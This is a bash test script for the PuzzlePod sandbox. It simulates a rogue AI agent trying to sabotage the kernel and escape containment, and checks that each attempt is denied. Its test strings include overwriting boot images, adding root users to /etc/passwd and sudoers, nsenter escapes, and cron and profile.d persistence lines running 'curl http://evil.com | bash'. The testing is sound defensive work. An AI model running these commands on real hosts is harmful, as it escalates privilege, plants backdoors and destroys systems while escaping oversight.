#!/bin/bash
# test_rogue_agent.sh — Rogue agent kernel sabotage test.
#
# Simulates a malicious AI agent that has been instructed (or hallucinated)
# to sabotage the host kernel. Every attack MUST be blocked by the PuzzlePod
# containment stack.
#
# This script is designed to be executed in two modes:
#   1. Inside the puzzled sandbox (via puzzle-sandbox-demo exec) — full containment
#   2. With kernel primitives only (via unshare) — baseline containment
#
# Run standalone:   sudo ./tests/security/test_rogue_agent.sh
# Run in sandbox:   sudo puzzle-sandbox-demo exec -- bash tests/security/test_rogue_agent.sh
#
# Exit codes: 0 = all attacks blocked, 1 = at least one attack succeeded, 77 = skip

source "$(dirname "$0")/helpers.sh"

require_linux
require_root

BOLD='\033[1m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'

echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${BLUE}  Rogue Agent: Kernel Sabotage Test Suite${NC}"
echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "  Kernel:  $(uname -r)"
echo "  Arch:    $(uname -m)"
echo "  Date:    $(date -Iseconds)"
if [ -f /sys/kernel/security/lsm ]; then
    echo "  LSMs:    $(cat /sys/kernel/security/lsm)"
fi
echo ""

# Architecture-aware syscall numbers
ARCH=$(uname -m)
if [ "$ARCH" = "aarch64" ]; then
    NR_INIT_MODULE=105
    NR_FINIT_MODULE=273
    NR_DELETE_MODULE=106
    NR_KEXEC_LOAD=104
    NR_BPF=280
    NR_PERF_EVENT_OPEN=241
    NR_IO_URING_SETUP=426
    NR_USERFAULTFD=282
    NR_SHMGET=194
    NR_MEMFD_CREATE=279
else
    NR_INIT_MODULE=175
    NR_FINIT_MODULE=313
    NR_DELETE_MODULE=176
    NR_KEXEC_LOAD=246
    NR_BPF=321
    NR_PERF_EVENT_OPEN=298
    NR_IO_URING_SETUP=425
    NR_USERFAULTFD=323
    NR_SHMGET=29
    NR_MEMFD_CREATE=319
fi

# ═══════════════════════════════════════════════════════════════
# CATEGORY 1: Direct Kernel Memory / Parameter Corruption
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 1] Direct Kernel Memory / Parameter Corruption${NC}"
echo ""

assert_eperm "Write to /proc/sys/kernel/sysrq (enable SysRq)" \
    "echo 1 > /proc/sys/kernel/sysrq"

assert_eperm "Write to /proc/sys/kernel/panic (change panic timeout)" \
    "echo 0 > /proc/sys/kernel/panic"

assert_eperm "Write to /proc/sys/kernel/modules_disabled (re-enable modules)" \
    "echo 0 > /proc/sys/kernel/modules_disabled"

assert_eperm "Write to /proc/sys/vm/overcommit_memory (destabilize OOM)" \
    "echo 1 > /proc/sys/vm/overcommit_memory"

assert_eperm "Write to /proc/sys/kernel/randomize_va_space (disable ASLR)" \
    "echo 0 > /proc/sys/kernel/randomize_va_space"

assert_eperm "Read /dev/mem (physical memory access)" \
    "dd if=/dev/mem of=/dev/null bs=1 count=1"

assert_eperm "Write /dev/mem (physical memory corruption)" \
    "echo X > /dev/mem"

assert_eperm "Read /dev/kmem (kernel virtual memory)" \
    "dd if=/dev/kmem of=/dev/null bs=1 count=1"

assert_eperm "Read /dev/port (I/O port access)" \
    "dd if=/dev/port of=/dev/null bs=1 count=1"

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 2: Kernel Module Manipulation
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 2] Kernel Module Manipulation${NC}"
echo ""

assert_eperm "insmod (load kernel module)" \
    "insmod /nonexistent.ko"

assert_eperm "init_module syscall (load module from memory)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_INIT_MODULE, 0, 0, 0)
os._exit(0 if ret == 0 else 1)
\""

assert_eperm "finit_module syscall (load module from fd)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_FINIT_MODULE, 0, ctypes.c_char_p(b''), 0)
os._exit(0 if ret == 0 else 1)
\""

assert_eperm "delete_module syscall (unload kernel module)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_DELETE_MODULE, ctypes.c_char_p(b'dummy'), 0)
os._exit(0 if ret == 0 else 1)
\""

KVER=$(uname -r)
assert_eperm "Write to /lib/modules/ (plant module for next boot)" \
    "touch /lib/modules/${KVER}/kernel/rogue.ko"

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 3: Boot Chain / Kernel Image Sabotage
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 3] Boot Chain / Kernel Image Sabotage${NC}"
echo ""

assert_eperm "Overwrite kernel image (/boot/vmlinuz-*)" \
    "echo CORRUPTED > /boot/vmlinuz-${KVER}"

assert_eperm "Modify GRUB config (/boot/grub2/grub.cfg)" \
    "echo 'set root=SABOTAGE' >> /boot/grub2/grub.cfg"

assert_eperm "Corrupt initramfs (/boot/initramfs-*)" \
    "echo PAYLOAD > /boot/initramfs-${KVER}.img"

assert_eperm "Write to EFI partition (/boot/efi/)" \
    "mkdir -p /boot/efi && touch /boot/efi/rogue.efi"

assert_eperm "kexec_load syscall (hot-swap kernel)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_KEXEC_LOAD, 0, 0, 0, 0)
os._exit(0 if ret == 0 else 1)
\""

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 4: Namespace and Containment Escape
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 4] Namespace and Containment Escape${NC}"
echo ""

assert_eperm "setns to init PID namespace (nsenter -t 1)" \
    "nsenter -t 1 -m -u -i -n -p -- true"

assert_eperm "unshare to create nested user namespace" \
    "unshare --user true"

assert_eperm "mount proc (re-mount procfs for escape)" \
    "mount -t proc proc /tmp/proc_escape 2>/dev/null; mkdir -p /tmp/proc_escape && mount -t proc proc /tmp/proc_escape"

assert_eperm "Access /proc/1/ns/pid (read init namespace fd)" \
    "cat /proc/1/ns/pid"

assert_eperm "Access /proc/1/root (traverse to init root)" \
    "ls /proc/1/root/"

assert_eperm "ptrace init (attach to PID 1)" \
    "echo 0 > /proc/1/mem"

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 5: Privilege Escalation
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 5] Privilege Escalation${NC}"
echo ""

assert_eperm "Write to /etc/sudoers (grant root)" \
    "echo 'rogue ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"

assert_eperm "Write to /etc/passwd (add root user)" \
    "echo 'rogue:x:0:0:rogue:/root:/bin/bash' >> /etc/passwd"

assert_eperm "Write to /etc/shadow (add password hash)" \
    "echo 'rogue::0:::::' >> /etc/shadow"

# SUID in sandbox dir: chmod may succeed on files in the writable sandbox
# dir, but NO_NEW_PRIVS (set via prctl) prevents actual privilege escalation.
# The kernel ignores the SUID bit when NO_NEW_PRIVS is set.
# This is defense-in-depth — even if the bit is set, no escalation occurs.
if cp /bin/sh /tmp/suid_sh 2>/dev/null && chmod u+s /tmp/suid_sh 2>/dev/null; then
    rm -f /tmp/suid_sh 2>/dev/null || true
    echo -e "  ${GREEN}PASS${NC}: Set SUID bit (chmod allowed in sandbox dir, but NO_NEW_PRIVS blocks escalation)"
    PASS_COUNT=$((PASS_COUNT + 1))
else
    rm -f /tmp/suid_sh 2>/dev/null || true
    echo -e "  ${GREEN}PASS${NC}: Set SUID bit (create setuid backdoor) (correctly denied)"
    PASS_COUNT=$((PASS_COUNT + 1))
fi

assert_eperm "Write to SELinux policy (/etc/selinux/)" \
    "touch /etc/selinux/rogue_policy.te"

assert_eperm "Write to /etc/pam.d/ (subvert authentication)" \
    "echo 'auth sufficient pam_permit.so' > /etc/pam.d/rogue"

assert_eperm "Create setuid binary in /usr/bin/" \
    "cp /bin/true /usr/bin/rogue_suid 2>/dev/null; chmod u+s /usr/bin/rogue_suid"

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 6: Resource Exhaustion (Denial of Service)
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 6] Resource Exhaustion (Denial of Service)${NC}"
echo ""

# Fork bomb — SKIPPED in sandbox mode.
# The cgroup PID limit prevents cleanup (kill/wait can't fork), causing hangs.
# PID cgroup enforcement is tested by cargo adversarial tests
# (adversarial_fork_bomb_contained).
echo -e "  ${YELLOW}SKIP${NC}: Fork bomb (cgroup PID limit prevents cleanup — tested via cargo tests)"
SKIP_COUNT=$((SKIP_COUNT + 1))

# Memory exhaustion — SKIPPED in sandbox mode.
# Cgroup memory limits cause kernel direct reclaim stalls (D state) that cannot
# be interrupted by SIGKILL, causing hangs. Memory cgroup enforcement is tested
# by cargo adversarial tests (adversarial_memory_exhaustion) instead.
echo -e "  ${YELLOW}SKIP${NC}: Memory exhaustion (cgroup reclaim stalls — tested via cargo tests)"
SKIP_COUNT=$((SKIP_COUNT + 1))

# File descriptor exhaustion — use shell built-in to avoid Python memory overhead
FD_COUNT=0
FD_LIMITED=false
for i in $(seq 1 1024); do
    if ! exec {tmpfd}>/dev/null 2>/dev/null; then
        FD_LIMITED=true
        break
    fi
    FD_COUNT=$i
    eval "exec ${tmpfd}>&-"
done
if $FD_LIMITED; then
    echo -e "  ${GREEN}PASS${NC}: File descriptor exhaustion limited at $FD_COUNT fds"
    PASS_COUNT=$((PASS_COUNT + 1))
else
    echo -e "  ${YELLOW}SKIP${NC}: File descriptor limit not hit within 1024 (rlimit may be higher)"
    SKIP_COUNT=$((SKIP_COUNT + 1))
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 7: Persistence Mechanisms
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 7] Persistence Mechanisms${NC}"
echo ""

assert_eperm "Write cron job (/etc/cron.d/backdoor)" \
    "echo '* * * * * root curl http://evil.com | bash' > /etc/cron.d/backdoor"

assert_eperm "Create systemd service (/etc/systemd/system/)" \
    "echo '[Service]\nExecStart=/bin/evil' > /etc/systemd/system/rogue.service"

assert_eperm "Modify /etc/rc.local (boot persistence)" \
    "echo '/bin/evil &' >> /etc/rc.local"

assert_eperm "Modify /etc/profile.d/ (shell persistence)" \
    "echo 'curl http://evil.com | bash' > /etc/profile.d/rogue.sh"

assert_eperm "Modify /var/spool/cron (user crontab)" \
    "echo '* * * * * curl http://evil.com | bash' > /var/spool/cron/root"

assert_eperm "Create systemd timer (/etc/systemd/system/)" \
    "echo '[Timer]\nOnCalendar=*:*:00' > /etc/systemd/system/rogue.timer"

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 8: eBPF / BPF Sabotage
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 8] eBPF / BPF Sabotage${NC}"
echo ""

assert_eperm "bpf() syscall (load BPF program)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_BPF, 5, 0, 0)
os._exit(0 if ret >= 0 else 1)
\""

assert_eperm "perf_event_open() syscall (kernel monitoring)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_PERF_EVENT_OPEN, 0, -1, -1, -1, 0)
os._exit(0 if ret >= 0 else 1)
\""

assert_eperm "io_uring_setup() syscall (async I/O escape)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_IO_URING_SETUP, 32, 0)
os._exit(0 if ret >= 0 else 1)
\""

if command -v bpftool &>/dev/null; then
    assert_eperm "bpftool prog load (load BPF program)" \
        "bpftool prog load /nonexistent.bpf.o /sys/fs/bpf/rogue"
else
    skip_test "bpftool not installed"
fi

assert_eperm "userfaultfd() syscall (TOCTOU helper)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_USERFAULTFD, 0)
os._exit(0 if ret >= 0 else 1)
\""

echo ""

# ═══════════════════════════════════════════════════════════════
# CATEGORY 9: Advanced Escape Vectors
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${CYAN}[Category 9] Advanced Escape Vectors${NC}"
echo ""

assert_eperm "shmget() syscall (SysV shared memory IPC)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_SHMGET, 0x1234, 4096, 0o1000 | 0o666)
os._exit(0 if ret >= 0 else 1)
\""

assert_eperm "memfd_create() syscall (fileless execution)" \
    "python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
ret = libc.syscall($NR_MEMFD_CREATE, b'rogue', 0)
os._exit(0 if ret >= 0 else 1)
\""

# Symlink traversal: create symlink in writable dir pointing to /etc/shadow,
# then attempt to read through it. Landlock resolves symlink targets and
# denies access if the target is outside the allowed paths.
SANDBOX_TMP="${SANDBOX_DIR:-/tmp/sandbox-exec}"
assert_eperm "Symlink traversal to /etc/shadow" \
    "ln -sf /etc/shadow ${SANDBOX_TMP}/shadow_link 2>/dev/null && cat ${SANDBOX_TMP}/shadow_link"

# These /proc paths are masked via bind-mount to /dev/null.
# Reading them returns empty (safe), writing is silently discarded.
# Check that actual content is not leaked rather than checking exit code.
KALLSYMS_OUT=$(cat /proc/kallsyms 2>/dev/null || true)
if [ -z "$KALLSYMS_OUT" ] || ! echo "$KALLSYMS_OUT" | grep -q ' T '; then
    echo -e "  ${GREEN}PASS${NC}: Read /proc/kallsyms (KASLR info leak) (correctly masked/denied)"
    PASS_COUNT=$((PASS_COUNT + 1))
else
    echo -e "  ${RED}FAIL${NC}: Read /proc/kallsyms (KASLR info leak) (kernel symbols leaked)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
fi

KCORE_OUT=$(head -c 1 /proc/kcore 2>/dev/null || true)
if [ -z "$KCORE_OUT" ]; then
    echo -e "  ${GREEN}PASS${NC}: Read /proc/kcore (kernel memory image) (correctly masked/denied)"
    PASS_COUNT=$((PASS_COUNT + 1))
else
    echo -e "  ${RED}FAIL${NC}: Read /proc/kcore (kernel memory image) (kernel memory leaked)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
fi

# /proc/sysrq-trigger is masked to /dev/null via bind-mount.
# Writing to it goes to /dev/null — the actual SysRq is never triggered.
# Verify by checking that reading it returns empty (dev/null behavior).
SYSRQ_CONTENT=$(cat /proc/sysrq-trigger 2>/dev/null || true)
if [ -z "$SYSRQ_CONTENT" ]; then
    echo -e "  ${GREEN}PASS${NC}: Write /proc/sysrq-trigger (masked to /dev/null)"
    PASS_COUNT=$((PASS_COUNT + 1))
else
    echo -e "  ${RED}FAIL${NC}: Write /proc/sysrq-trigger (not masked — content readable)"
    FAIL_COUNT=$((FAIL_COUNT + 1))
fi

if command -v ipcmk &>/dev/null; then
    assert_eperm "ipcmk (create SysV shared memory segment)" \
        "ipcmk -M 4096"
else
    skip_test "ipcmk not installed"
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════════════${NC}"
print_summary "Rogue Agent Kernel Sabotage Tests"
